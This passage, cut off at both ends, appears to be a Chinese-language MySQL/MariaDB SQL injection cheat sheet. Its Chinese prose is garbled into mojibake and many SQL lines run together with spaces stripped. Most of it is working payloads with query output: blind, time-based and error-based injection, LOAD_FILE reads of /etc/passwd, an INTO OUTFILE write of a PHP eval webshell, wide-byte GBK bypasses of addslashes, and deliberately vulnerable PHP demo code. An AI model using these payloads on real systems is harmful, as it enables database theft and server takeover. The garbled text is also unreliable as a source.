or \u0026#39;1\u0026#39;=\u0026#39;11%\u0026#39; and (bool) or 1=1 and \u0026#39;1\u0026#39;=\u0026#39;1æœ‰æ—¶å€™ä¹Ÿå¯ä»¥é€šè¿‡ä¸è¡¨ä¸­çš„æ•°æ®è¿›è¡Œå¯¹æ¯”\nmysql\u0026gt; select * from admin where username=\u0026quot;\u0026quot; || id=2 \u0026amp;\u0026amp; password\u0026lt;\u0026quot;5\u0026quot;; +----+----------+----------+------+ | id | username | password | num | +----+----------+----------+------+ | 2 | admin | 456 | 20 | +----+----------+----------+------+ 1 row in set (0.00 sec) mysql\u0026gt; select * from admin where username=\u0026quot;\u0026quot; || id=3 \u0026amp;\u0026amp; password\u0026lt;\u0026quot;8\u0026quot;; +----+----------+----------+------+ | id | username | password | num | +----+----------+----------+------+ | 3 | test | 789 | 30 | +----+----------+----------+------+ 1 row in set (0.00 sec) mysql\u0026gt; select * from admin where username=\u0026quot;\u0026quot; || id=3 \u0026amp;\u0026amp; password\u0026lt;\u0026quot;7\u0026quot;; Empty set (0.00 sec) è¿™æ ·é€šè¿‡idæŒ‡å®šçš„è¯æ”¹ä¸€ä¸‹payloadç›´æ¥ä¸Šè„šæœ¬æŠŠæ•°æ®å…¨è„±äº†ã€‚å¦å¤–å¦‚æœæƒ³è·¨è¡¨æŸ¥è¯¢çš„è¯\nmysql\u0026gt; select a.password\u0026lt;'z' from users a limit 1,1; +----------------+ | a.password\u0026lt;'z' | +----------------+ | 1 | +----------------+ æ„é€ é€»è¾‘åˆ¤æ–­ left(user(),1)\u0026gt;'r' right(user(),1)\u0026gt;'r' substr(user(),1,1)='r' mid(user(),1,1)='r' //ä¸ä½¿ç”¨é€—å· user() regexp '^[a-z]' user() like 'root%' POSITION('root' in user()) mid(user() from 1 for 1)='r' mid(user() from 1)='r' ASCII()ã€ORD()å’ŒCHAR()å‡½æ•°ä¸€èˆ¬ç”¨åšè¾…åŠ©ã€‚\nåˆ©ç”¨ order by ç›²æ³¨ mysql\u0026gt; select * from admin where username='' or 1 union select 1,2,'5' order by 3; +----+----------+----------------------------------+ | id | username | password | +----+----------+----------------------------------+ | 1 | 2 | 5 | | 1 | admin | 51b7a76d51e70b419f60d3473fb6f900 | +----+----------+----------------------------------+ 2 rows in set (0.00 sec) mysql\u0026gt; select * from admin where username='' or 1 union select 1,2,'6' order by 3; +----+----------+----------------------------------+ | id | username | password | +----+----------+----------------------------------+ | 1 | admin | 51b7a76d51e70b419f60d3473fb6f900 | | 1 | 2 | 6 | +----+----------+----------------------------------+ 2 rows in set (0.01 sec) è¿™ç§æ³¨å…¥ä¸€èˆ¬å‡ºç°åœ¨ç™»å½•å¤„ï¼Œå½¢æˆboolæ¡ä»¶ã€‚è¿™é‡Œåªè·å–passwordçš„å€¼ï¼Œä¹Ÿå¯ä»¥è·Ÿå¤šä¸ªUNIONæŸ¥è¯¢å…¶ä»–çš„æ•°æ®ï¼Œæ­¤æ–¹æ³•ä¼˜ç‚¹åœ¨äºä¸ä½¿ç”¨æ‹¬å·ç­‰å·ç­‰å­—ç¬¦ã€‚åˆ©ç”¨order byå§¿åŠ¿å¾ˆå¤šï¼Œè‡ªç”±å‘æŒ¥äº†ã€‚\nå»¶æ—¶æ³¨å…¥ ä¸€èˆ¬ä¼šç”¨åˆ°å‡ ä¸ªå‡½æ•°ã€‚ä½¿ç”¨è¿™äº›çš„æ•ˆæœï¼Œæ˜¯ä¸ºäº†å»¶ç¼“mysqlçš„æ“ä½œï¼Œä»è€Œæ£€æµ‹åˆ°ä¸å¹³æ—¶æœ‰å¼‚çš„æƒ…å†µï¼š\n SLEEP(n) è®©mysqlåœnç§’é’Ÿ BENCHMARK(count,expr) é‡å¤countTimesæ¬¡æ‰§è¡Œè¡¨è¾¾å¼exprï¼Œå¦‚BENCHMARK(100000,MD5(1))  BENCHMARK()ç”¨äºæµ‹è¯•å‡½æ•°çš„æ€§èƒ½ï¼Œå‚æ•°ä¸€ä¸ºæ¬¡æ•°ï¼ŒäºŒä¸ºè¦æ‰§è¡Œçš„è¡¨è¾¾å¼ã€‚å¯ä»¥è®©å‡½æ•°æ‰§è¡Œè‹¥å¹²æ¬¡ï¼Œè¿”å›ç»“æœæ¯”å¹³æ—¶è¦é•¿ï¼Œé€šè¿‡æ—¶é—´é•¿çŸ­çš„å˜åŒ–ï¼Œåˆ¤æ–­è¯­å¥æ˜¯å¦æ‰§è¡ŒæˆåŠŸã€‚è¿™æ˜¯ä¸€ç§è¾¹ä¿¡é“æ”»å‡»ï¼Œåœ¨è¿è¡Œè¿‡ç¨‹ä¸­å ç”¨å¤§é‡çš„ cpu èµ„æºã€‚æ¨èä½¿ç”¨sleep()ã€‚\nä¸€äº›æ³¨æ„äº‹é¡¹ï¼š\n ä½¿ç”¨åŸºäºæ—¶é—´çš„ç›²æ³¨æ¯”è¾ƒä¸å‡†ç¡®ï¼Œå› ä¸ºè¿™è¿˜å–å†³äºå½“å‰çš„ç½‘ç»œç¯å¢ƒã€‚ æ—¶é—´å»¶ç¼“æœ€å¥½ä¸è¦è¶…è¿‡30ç§’ï¼Œå¦åˆ™å®¹æ˜“å¯¼è‡´mysqlçš„APIè¿æ¥è¶…æ—¶ã€‚ å½“åœ¨é¡µé¢ä¸Šçœ‹ä¸åˆ°ä»»ä½•æ˜æ˜¾å˜åŒ–æ—¶ï¼Œå†è€ƒè™‘é€‰æ‹©ä½¿ç”¨å»¶æ—¶æ³¨å…¥  ç›¸å¯¹äºboolç›²æ³¨ï¼Œå°±æ˜¯æŠŠè¿”å›å€¼0å’Œ1æ”¹ä¸ºæ˜¯å¦æ‰§è¡Œå»¶æ—¶ï¼Œèƒ½ç”¨å…¶ä»–æ–¹æ³•å°±ä¸ä½¿ç”¨å»¶æ—¶ã€‚\nä¸€èˆ¬æ ¼å¼if((bool),sleep(3),0)å’Œor (case when (bool) then sleep(3) else 0 end)\nå¦‚æœè¿™ä¸¤ä¸ªå‡½æ•°banæ‰çš„è¯å¯ä»¥åˆ©ç”¨ç¬›å¡å°”ç§¯é€ æˆå»¶è¿Ÿæ¥è¿›è¡Œæ³¨å…¥ã€‚\n' and if(ascii(substr((select database()),%d,1))\u0026lt;%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.tables C),1)# å¦å¤–è¿˜å¯ä»¥åˆ©ç”¨ä¸æ­£ç¡®çš„æ­£åˆ™è¡¨è¾¾å¼æ¥\nselect if(substr((select 1)='1',1,1),concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',1); æ£€æµ‹æ–¹æ³• 1 OR SLEEP(25)=0 LIMIT 1 # 1) OR SLEEP(25)=0 LIMIT 1 # 1' OR SLEEP(25)=0 LIMIT 1 # ') OR SLEEP(25)=0 LIMIT 1 # 1)) OR SLEEP(25)=0 LIMIT 1 # SELECT SLEEP(25) # payload UNIONSELECTIF(SUBSTR((SELECTGROUP_CONCAT(schema_nameSEPARATOR0x3c62723e)FROMINFORMATION_SCHEMA.SCHEMATA),i,1)\u0026lt;j,BENCHMARK(100000,SHA1(1)),0);UNIONSELECTIF(SUBSTR((SELECTGROUP_CONCAT(schema_nameSEPARATOR0x3c62723e)FROMINFORMATION_SCHEMA.SCHEMATA),i,1)\u0026lt;j,SLEEP(10),0);insert/update/delete æ³¨å…¥ insert æŠ¥é”™æ³¨å…¥æ–¹å¼ï¼š\ninsertintomessage(id,user_id,message_id)values(4,\u0026#39;zedd\u0026#39;orupdatexml(1,concat(0x7e,(select@@version),0x7e),0)or\u0026#39;\u0026#39;,\u0026#39;hi\u0026#39;);insertintomessage(id,user_id,message_id)values(4,\u0026#39;zedd\u0026#39;orextractvalue(1,concat(0x7e,(select@@version)))or\u0026#39;\u0026#39;,\u0026#39;hi\u0026#39;);æ²¡æœ‰å›æ˜¾å¯ä»¥ä½¿ç”¨å»¶æ—¶\ninsertintomessage(id,user_id,message_id)values(5,\u0026#39;0\u0026#39;orIF(SUBSTR((SELECTGROUP_CONCAT(schema_name)FROMINFORMATION_SCHEMA.SCHEMATA),1,1)\u0026lt;200,SLEEP(10),0),\u0026#39;hi\u0026#39;);update æŠ¥é”™æ³¨å…¥æ–¹å¼ï¼š\nupdatemessagesetuser_id=\u0026#39;1\u0026#39;orupdatexml(1,concat(0x7e,(version()),0x7e),0)or\u0026#39;\u0026#39;WHEREid=2;updatemessagesetuser_id=\u0026#39;1\u0026#39;orextractvalue(1,concat(0x7e,database()))or\u0026#39;\u0026#39;WHEREid=2;delete æŠ¥é”™æ³¨å…¥æ–¹å¼ï¼š\nDELETEFROMmessageWHEREid=2orupdatexml(1,concat(0x7e,(version()),0x7e),0)or\u0026#39;\u0026#39;;DELETEFROMmessageWHEREid=2orextractvalue(1,concat(0x7e,database()))or\u0026#39;\u0026#39;;Order by åæ³¨å…¥ æŠ¥é”™æ³¨å…¥ 1andextractvalue(1,concat(0x7e,(select@@version),0x7e));boolç›²æ³¨ åˆ©ç”¨ rand() orderbyIF((bool),1,(select1unionselect2));ä½¿ç”¨rand\nMariaDB[test]\u0026gt;selectidfrommessageorderbyrand(true);+----+ |id|+----+ |5||3||1||2|+----+ 4rowsinset(0.002sec)MariaDB[test]\u0026gt;selectidfrommessageorderbyrand(false);+----+ |id|+----+ |1||5||2||3|+----+ 4rowsinset(0.001sec)rand(true)ä¸rand(flase)è¿”å›ä¸åŒæ¥åˆ¤æ–­\nMariaDB[test]\u0026gt;selectidfrommessageorderbyrand(SUBSTR((SELECTdatabase()),1,1)\u0026gt;\u0026#39;t\u0026#39;);+----+ |id|+----+ |1||5||2||3|+----+ 4rowsinset(0.001sec)MariaDB[test]\u0026gt;selectidfrommessageorderbyrand(SUBSTR((SELECTdatabase()),1,1)\u0026lt;\u0026#39;t\u0026#39;);+----+ |id|+----+ |1||5||2||3|+----+ 4rowsinset(0.000sec)MariaDB[test]\u0026gt;selectidfrommessageorderbyrand(SUBSTR((SELECTdatabase()),1,1)=\u0026#39;t\u0026#39;);+----+ |id|+----+ |5||3||1||2|+----+ 4rowsinset(0.000sec)å»¶æ—¶æ³¨å…¥ order by if() ä¸æ¨èï¼Œå› ä¸ºæ¯æ¡æ•°æ®éƒ½ä¼šæ‰§è¡Œå»¶æ—¶ï¼Œèƒ½ç”¨å…¶ä»–æ–¹æ³•å°±ä¸ä½¿ç”¨å»¶æ—¶ã€‚\nMariaDB[test]\u0026gt;selectidfrommessageorderbyIF(1,sleep(3),0);+----+ |id|+----+ |1||2||3||5|+----+ 4rowsinset(12.214sec)å»¶æ—¶äº† 12s å·¦å³ã€‚\nLimit æ³¨å…¥ å…ˆçœ‹çœ‹ Mysql 5 ä¸­çš„ select è¯­æ³•\nSELECT[ALL|DISTINCT|DISTINCTROW][HIGH_PRIORITY][STRAIGHT_JOIN][SQL_SMALL_RESULT][SQL_BIG_RESULT][SQL_BUFFER_RESULT][SQL_CACHE|SQL_NO_CACHE][SQL_CALC_FOUND_ROWS]select_expr[,select_expr...][FROMtable_references[WHEREwhere_condition][GROUPBY{col_name|expr|position}[ASC|DESC],...[WITHROLLUP]][HAVINGwhere_condition][ORDERBY{col_name|expr|position}[ASC|DESC],...][LIMIT{[offset,]row_count|row_countOFFSEToffset}][PROCEDUREprocedure_name(argument_list)][INTOOUTFILE\u0026#39;file_name\u0026#39;export_options|INTODUMPFILE\u0026#39;file_name\u0026#39;|INTOvar_name[,var_name]][FORUPDATE|LOCKINSHAREMODE]]å¯ä»¥çœ‹åˆ°LIMITåå¯ä»¥æ¥PROCEDUREä¸INTOï¼Œè€ŒINTOç”¨äºå†™ webshell ä½¿ç”¨ï¼Œè¿™é‡Œæ¥ä¸èµ˜è¿°ï¼Œæˆ‘ä»¬é‡ç‚¹æ¥çœ‹PROCUDUREï¼Œè€Œä¸”è¿™é‡Œä¸ç‰ˆæœ¬æœ‰å…³ï¼Œæ–°ç‰ˆæœ¬çš„åœ¨PROCUDUREä¸­å·²ä¸æ”¯æŒä½¿ç”¨SELECT\nè€ç‰ˆæœ¬(ä¸ºæµ‹è¯•å…·ä½“ç‰ˆæœ¬å·ï¼Œä¼°è®¡åœ¨ 5.7 ä»¥å‰)å¯ä»¥è‹¥æ²¡æœ‰order byåå¯é¢æ¥unionï¼Œæœ‰order byå¯ç”¨benchmarkæˆ–è€…æŠ¥é”™æ³¨å…¥ï¼Œè¯¦æƒ…å‚è€ƒã€SQLæ³¨å…¥ã€‘mysql limit æ³¨å…¥\næŠ¥é”™æ³¨å…¥ MariaDB[test]\u0026gt;select*fromuserwhereid\u0026gt;0orderbyidLIMIT0,1;+----+----------+--------+ |id|username|passwd|+----+----------+--------+ |1|admin|admin|+----+----------+--------+ 1rowinset(0.001sec)MariaDB[test]\u0026gt;select*fromuserwhereid\u0026gt;0orderbyidLIMIT0,1procedureanalyse(extractvalue(rand(),concat(0x3a,version())),1);ERROR1105(HY000):XPATHsyntaxerror:\u0026#39;:10.3.11-MariaDB\u0026#39;Group By æ³¨å…¥ æŠ¥é”™æ³¨å…¥ MariaDB[test]\u0026gt;select*fromuserwhereid\u0026gt;0GROUPBYidandupdatexml(1,concat(0x7e,(SELECT@@version),0x7e),1);ERROR1105(HY000):XPATHsyntaxerror:\u0026#39;~10.3.11-MariaDB~\u0026#39;MariaDB[test]\u0026gt;select*fromuserwhereid\u0026gt;0GROUPBYidand(select1from(selectcount(*),concat((select(select(SELECT@@version))frominformation_schema.tableslimit0,1),floor(rand(0)*2))xfrominformation_schema.tablesgroupbyx)a);ERROR1062(23000):Duplicateentry\u0026#39;10.3.11-MariaDB1\u0026#39;forkey\u0026#39;group_key\u0026#39;å»¶æ—¶æ³¨å…¥ MariaDB[test]\u0026gt;select*fromuserwhereid\u0026gt;0GROUPBYidandif(mid(user(),1,1)=\u0026#39;r\u0026#39;,sleep(3),0);+----+----------+--------+ |id|username|passwd|+----+----------+--------+ |1|admin|admin|+----+----------+--------+ 1rowinset(9.150sec)Union æ³¨å…¥ MariaDB[test]\u0026gt;select*fromuserwhereid\u0026gt;0GROUPBYidunionselect1,2,3;+----+----------+--------+ |id|username|passwd|+----+----------+--------+ |1|admin|admin||2|hasaki|hasaki||3|666|2333||1|2|3|+----+----------+--------+ 4rowsinset(0.000sec)MariaDB[test]\u0026gt;select*fromuserwhereid\u0026gt;0GROUPBYidunionselect1,2,3limit3,1;+----+----------+--------+ |id|username|passwd|+----+----------+--------+ |1|2|3|+----+----------+--------+ 1rowinset(0.000sec)MariaDB[test]\u0026gt;select*fromuserwhereid\u0026gt;0GROUPBYidunionselect1,user(),3limit3,1;+----+----------------+--------+ |id|username|passwd|+----+----------------+--------+ |1|root@localhost|3|+----+----------------+--------+ 1rowinset(0.002sec)è¯»å†™æ–‡ä»¶ åˆ©ç”¨sqlæ³¨å…¥å¯ä»¥å¯¼å…¥å¯¼å‡ºæ–‡ä»¶ï¼Œè·å–æ–‡ä»¶å†…å®¹ï¼Œæˆ–å‘æ–‡ä»¶å†™å…¥å†…å®¹ã€‚\næŸ¥è¯¢ç”¨æˆ·è¯»å†™æƒé™ï¼š\nSELECTfile_privFROMmysql.userWHEREuser=\u0026#39;root\u0026#39;;é¦–å…ˆæŸ¥çœ‹å˜é‡ç¡®å®šæƒé™\nshowvariableslike\u0026#39;%secure%\u0026#39;; å½“ secure_file_priv ä¸ºç©ºï¼Œå°±å¯ä»¥è¯»å–ç£ç›˜çš„ç›®å½•ã€‚ å½“ secure_file_priv ä¸ºG:\\ï¼Œå°±å¯ä»¥è¯»å–Gç›˜çš„æ–‡ä»¶ã€‚ å½“ secure_file_priv ä¸º nullï¼Œload_file å°±ä¸èƒ½åŠ è½½æ–‡ä»¶ã€‚  load_file()è¯»å– æ¡ä»¶\n éœ€è¦æœ‰è¯»å–æ–‡ä»¶çš„æƒé™ éœ€è¦çŸ¥é“æ–‡ä»¶çš„ç»å¯¹ç‰©ç†è·¯å¾„ã€‚ è¦è¯»å–çš„æ–‡ä»¶å¤§å°å¿…é¡»å°äº max_allowed_packet  SELECT@@max_allowed_packet;ç›´æ¥ä½¿ç”¨ç»å¯¹è·¯å¾„\nSELECTLOAD_FILE(\u0026#34;/etc/passwd\u0026#34;);SELECTLOAD_FILE(CHAR(47,101,116,99,47,112,97,115,115,119,100));SELECTLOAD_FILE(0x2f6574632f706173737764);SELECT å¯¼å‡º æ¡ä»¶\n ä¸€èˆ¬è¦æŒ‡å®šç»å¯¹è·¯å¾„ éœ€å¯¼å‡ºçš„ç›®å½•æœ‰å¯å†™æƒé™ è¦outfileå‡ºçš„æ–‡ä»¶ä¸èƒ½å·²ç»å­˜åœ¨  SELECTDATABASE()INTOOUTFILE\u0026#39;/tmp/test\u0026#39;;å†™å…¥ WebShell æ¡ä»¶\n éœ€è¦çŸ¥é“ç½‘ç«™çš„ç»å¯¹ç‰©ç†è·¯å¾„ï¼Œè¿™æ ·å¯¼å‡ºåçš„webshellå¯è®¿é—® å¯¹éœ€å¯¼å‡ºçš„ç›®å½•æœ‰å¯å†™æƒé™ã€‚  SELECT\u0026#34;\u0026lt;?php eval($_POST[\u0026#39;a\u0026#39;])?\u0026gt;\u0026#34;INTOOUTFILE\u0026#39;/var/www/html/shell.php\u0026#39;;å®½å­—èŠ‚æ³¨å…¥ åŸç† mysql_query(\u0026#34;SET NAMES \u0026#39;gbk\u0026#39;\u0026#34;); $name = isset($_GET[\u0026#39;name\u0026#39;]) ? addslashes($_GET[\u0026#39;name\u0026#39;]) : 1; $sql = \u0026#34;SELECT * FROM test WHERE names=\u0026#39;{$name}\u0026#39;\u0026#34;; addslashes()ä¼šåœ¨å•å¼•å·æˆ–åŒå¼•å·å‰åŠ ä¸Šä¸€ä¸ª\\ã€‚å½“ mysql ä½¿ç”¨ GBK å­—ç¬¦é›†æ—¶ï¼Œä¼šæŠŠä¸¤ä¸ªå­—ç¬¦å½“ä½œä¸€ä¸ªæ±‰å­—ï¼Œå¦‚%df%5cä¸ºé‹å­—ã€‚æˆ‘ä»¬è¾“å…¥name=root%df%27ï¼Œ%åœ¨æœåŠ¡å™¨ç«¯ä¼šå‡ºç°å¦‚ä¸‹è½¬æ¢ï¼šroot%df%27 -\u0026gt; root%df%5c%27 -\u0026gt; rooté‹'ã€‚\næ›´å¤šå†…å®¹å¯è§ï¼šæµ…æç™½ç›’å®¡è®¡ä¸­çš„å­—ç¬¦ç¼–ç åŠSQLæ³¨å…¥\nåˆ©ç”¨ index.php?name=1%df' index.php?name=1%a1' index.php?name=1%aa' ... åœ¨è¢«addslashesåï¼Œå‡ºç°%XX%5cï¼Œå½“å‰ä¸€ä¸ªå­—ç¬¦çš„ ascii ç å€¼å¤§äº 128 æ—¶ï¼Œä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªå®½å­—ç¬¦ï¼Œå³ä½¿å®ƒä¸æ˜¯ä¸ªæ±‰å­—ã€‚æ‰€ä»¥ä¸æ˜¯ä»…ä»…%dfå¯ä»¥åƒæ‰\\ã€‚\nè¡¨åå¯æ§æ³¨å…¥ è¯¦ç»†å¯å‚è€ƒå½“è¡¨åå¯æ§çš„æ³¨å…¥é‡åˆ°äº†Describeæ—¶çš„å‡ ç§æƒ…å†µ\nè¡¨åä¸å®Œå…¨å¯æ§ä¸”DESCçš„è¡¨åå«æœ‰åå¼•å·,SELECTçš„è¡¨åä¸å«åå¼•å· test.php ä»£ç å¦‚ä¸‹\n\u0026lt;?php mysql_connect(\u0026#34;127.0.0.1\u0026#34;,\u0026#34;root\u0026#34;,\u0026#34;123456\u0026#34;); mysql_query(\u0026#34;use test\u0026#34;); $table = $_GET[\u0026#39;table\u0026#39;]; mysql_query(\u0026#34;desc `shop_$table`\u0026#34;) or die(\u0026#34;DESC å‡ºé”™:\u0026#34;.mysql_error()); $sql = \u0026#34;select * from shop_$tablewhere 1=1\u0026#34;; echo $sql; echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; var_dump(mysql_fetch_array(mysql_query(\u0026#34;$sql\u0026#34;))); echo mysql_error(); payload :\nuser` `where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)%23` shop_users åé¢çš„ä¸¤ä¸ª``,åšäº†shop_users è¡¨çš„åˆ«åï¼Œæ‰€ä»¥æ— å½±å“ï¼Œä¸ä¼šè¿›å…¥ dieã€‚sql è¯­å¥æ‰å¾—ä»¥æ‰§è¡Œ\nselect*frommessage``whereupdatexml(1,concat(0x7e,(selectuser()),0x7e),1)#;where1=1; \nè¡¨åä¸å®Œå…¨å¯æ§ä¸”DESCçš„è¡¨åä¸å«åå¼•å·,SELECTçš„è¡¨åå«æœ‰åå¼•å· test.php æºç å¦‚ä¸‹ï¼š\n\u0026lt;?php mysql_connect(\u0026#34;127.0.0.1\u0026#34;,\u0026#34;root\u0026#34;,\u0026#34;123456\u0026#34;); mysql_query(\u0026#34;use test\u0026#34;); $table = $_GET[\u0026#39;table\u0026#39;]; mysql_query(\u0026#34;desc shop_{$table}\u0026#34;) or die(\u0026#34;DESC å‡ºé”™:\u0026#34;.mysql_error()); $sql = \u0026#34;select * from `shop_{$table}` where 1=1\u0026#34;; echo $sql; echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; var_dump(mysql_fetch_array(mysql_query(\u0026#34;$sql\u0026#34;))); echo mysql_error(); payload :\nuser` where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)%23` sql è¯­å¥ï¼š\nselect*from`shop_user`whereupdatexml(1,concat(0x5e24,(selectuser()),0x5e24),1)#``where1=1 \næ— åˆ—åæ³¨å…¥ åˆ«å MariaDB[test]\u0026gt;select*from(select1)a,(select2)b,(select3)c;+---+---+---+ |1|2|3|+---+---+---+ |1|2|3|+---+---+---+ 1rowinset(0.000sec)MariaDB[test]\u0026gt;select*from(select1)a,(select2)b,(select3)cunionselect*fromuser;+---+--------+--------+ |1|2|3|+---+--------+--------+ |1|2|3||1|admin|admin||2|hasaki|hasaki||3|666|2333|+---+--------+--------+ 4rowsinset(0.001sec)MariaDB[test]\u0026gt;selecte.3from(select*from(select1)a,(select2)b,(select3)cunionselect*fromuser)e;+--------+ |3|+--------+ |3||admin||hasaki||2333|+--------+ 4rowsinset(0.001sec)MariaDB[test]\u0026gt;selecte.3from(select*from(select1)a,(select2)b,(select3)cunionselect*fromuser)elimit1offset3;+------+ |3|+------+ |2333|+------+ 1rowinset(0.001sec)MariaDB[test]\u0026gt;select*fromuserwhereid=1unionselect1,2,3;+----+----------+--------+ |id|username|passwd|+----+----------+--------+ |1|admin|admin||1|2|3|+----+----------+--------+ 2rowsinset(0.000sec)MariaDB[test]\u0026gt;select*fromuserwhereid=1unionselect(selecte.3from(select*from(select1)a,(select2)b,(select3)cunionselect*fromuser)elimit1offset3),2,3;+------+----------+--------+ |id|username|passwd|+------+----------+--------+ |1|admin|admin||2333|2|3|+------+----------+--------+ 2rowsinset(0.001sec)å˜é‡ ä½¿ç”¨å˜é‡éœ€è¦æ‰§è¡Œä¸¤æ¬¡sql\nMariaDB[test]\u0026gt;select*fromuserlimit0,1into@a,@b,@c;QueryOK,1rowaffected(0.001sec)MariaDB[test]\u0026gt;select*fromuserwhereusername=\u0026#39;\u0026#39;unionselect@a,@b,@c;+------+----------+--------+ |id|username|passwd|+------+----------+--------+ |1|admin|admin|+------+----------+--------+ 1rowinset(0.002sec)å¯æŠ¥é”™æ—¶çˆ†è¡¨åã€å­—æ®µåã€åº“å å­—æ®µå ä¸Šæ–‡ä»‹ç»å¯ä»¥ä½¿ç”¨æ— åˆ—åæ³¨å…¥ï¼Œä½†æ˜¯å¦‚æœå†è¿›è¡Œé™åˆ¶ï¼Œä¸å…è®¸ä½¿ç”¨unionè¯¥æ€ä¹ˆç ´å‘¢ï¼Ÿ\nMariaDB[test]\u0026gt;select*fromuserwhereid=1and(select*from(select*fromuserasajoinuserasb)asc);ERROR1060(42S21):Duplicatecolumnname\u0026#39;id\u0026#39;æŠŠå½“å‰è¡¨ç¬¬ä¸€ä¸ªå­—æ®µæˆåŠŸçˆ†å‡ºæ¥äº†ã€‚è¿™ä¸ªçš„åŸç†å°±æ˜¯åœ¨ä½¿ç”¨åˆ«åçš„æ—¶å€™ï¼Œè¡¨ä¸­ä¸èƒ½å‡ºç°ç›¸åŒçš„å­—æ®µåï¼Œäºæ˜¯æˆ‘ä»¬å°±åˆ©ç”¨joinæŠŠè¡¨æ‰©å……æˆä¸¤ä»½ï¼Œåœ¨æœ€ååˆ«å c çš„æ—¶å€™æŸ¥è¯¢åˆ°é‡å¤å­—æ®µï¼Œå°±æˆåŠŸæŠ¥é”™ã€‚\nåŒæ—¶ï¼Œå¯ä»¥åˆ©ç”¨usingçˆ†å…¶ä»–å­—æ®µï¼š\nMariaDB[test]\u0026gt;select*fromuserwhereid=1and(select*from(select*fromuserasajoinuserasbusing(id))asc);ERROR1060(42S21):Duplicatecolumnname\u0026#39;username\u0026#39;MariaDB[test]\u0026gt;select*fromuserwhereid=1and(select*from(select*fromuserasajoinuserasbusing(id,username))asc);ERROR1060(42S21):Duplicatecolumnname\u0026#39;passwd\u0026#39;è¡¨å Mysql æ–‡æ¡£ä¸­æœ‰ä¸€ä¸ªå‡½æ•°ï¼š\nPolygon(ls1, ls2, â€¦)\nPolygonä»å¤šä¸ªLineStringæˆ–WKB LineStringå‚æ•° æ„é€ ä¸€ä¸ªå€¼ ã€‚å¦‚æœä»»ä½•å‚æ•°ä¸è¡¨ç¤ºLinearRingï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œä¸æ˜¯ä¸€ä¸ªå°é—­å’Œç®€å•çš„LineStringï¼‰ï¼Œè¿”å›å€¼å°±æ˜¯ NULL\nå¦‚æœä¼ å‚ä¸æ˜¯linestringçš„è¯ï¼Œå°±ä¼šçˆ†é”™ï¼Œè€Œå½“å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„æ˜¯å­˜åœ¨çš„å­—æ®µçš„è¯ï¼Œå°±ä¼šçˆ†å‡ºå·²çŸ¥åº“ã€è¡¨ã€åˆ—ã€‚\nselect*fromuserwhereid=1andPolygon(1);select*fromuserwhereid=1andpolygon(()select*from(selectuser())a)b);åº“å ä¸Šé¢çš„æ–¹æ³•å·²ç»å¯ä»¥çˆ†å‡ºåº“åäº†ï¼Œæä¾›å¦ä¸€ä¸ªæ–¹æ³•\nMariaDB[test]\u0026gt;select*fromuserwhereid=1-a();ERROR1305(42000):FUNCTIONtest.adoesnotexistçº¦æŸæ”»å‡» é¦–å…ˆ mysql 5.5 ç‰ˆæœ¬ä»¥ä¸Šéœ€è¦è®¾ç½®æ•°æ®åº“ä¸ºå®½æ¾æ¨¡å¼ï¼Œé¿å…å‡ºç°æ’å…¥é”™è¯¯ error\nset@@sql_mode=ANSI;é¦–å…ˆæŸ¥çœ‹åŸæ¥çš„sql_modeï¼Œä¿®æ”¹ä¸€æ¬¡sql_mode\nmysql\u0026gt;select@@sql_mode;+-------------------------------------------------------------------------------------------------------------------------------------------+ |@@sql_mode|+-------------------------------------------------------------------------------------------------------------------------------------------+ |ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION|+-------------------------------------------------------------------------------------------------------------------------------------------+ 1rowinset(0.00sec)mysql\u0026gt;set@@sql_mode=ANSI;QueryOK,0rowsaffected,1warning(0.00sec)mysql\u0026gt;select@@sql_mode;+--------------------------------------------------------------------------------+ |@@sql_mode|+--------------------------------------------------------------------------------+ |REAL_AS_FLOAT,PIPES_AS_CONCAT,ANSI_QUOTES,IGNORE_SPACE,ONLY_FULL_GROUP_BY,ANSI|+--------------------------------------------------------------------------------+ 1rowinset(0.00sec)åœ¨å®½æ¾æ¨¡å¼ä¸‹åˆ›å»ºæ•°æ®åº“ï¼Œå¹¶ä¸”å…ˆæ’å…¥adminçš„æ•°æ®\nmysql\u0026gt;CREATETABLEusers(-\u0026gt;usernamevarchar(25),-\u0026gt;passwordvarchar(25)-\u0026gt;);QueryOK,0rowsaffected(0.02sec)mysql\u0026gt;INSERTINTOusers(username,password)VALUES(\u0026#39;admin\u0026#39;,\u0026#39;rand_pass\u0026#39;);QueryOK,1rowaffected(0.001sec)mysql\u0026gt;select*fromuserswhereusername=\u0026#39;admin\u0026#39;;+----------+-----------+ |username|password|+----------+-----------+ |admin|rand_pass|+----------+-----------+ 1rowinset(0.00sec)å°è¯•æŸ¥è¯¢åŒ…å«æœ‰ç©ºæ ¼çš„adminæ•°æ®ï¼Œå‘ç°ç©ºæ ¼è¢«æˆªæ–­ï¼ŒæŸ¥åˆ°adminçš„æ•°æ®\nmysql\u0026gt;select*fromuserswhereusername=\u0026#39;admin \u0026#39;;+----------+-----------+ |username|password|+----------+-----------+ |admin|rand_pass|+----------+-----------+ 1rowinset(0.00sec)æ¥ç€å°è¯•æ’å…¥adminåé¢åŒ…å«æœ‰ç©ºæ 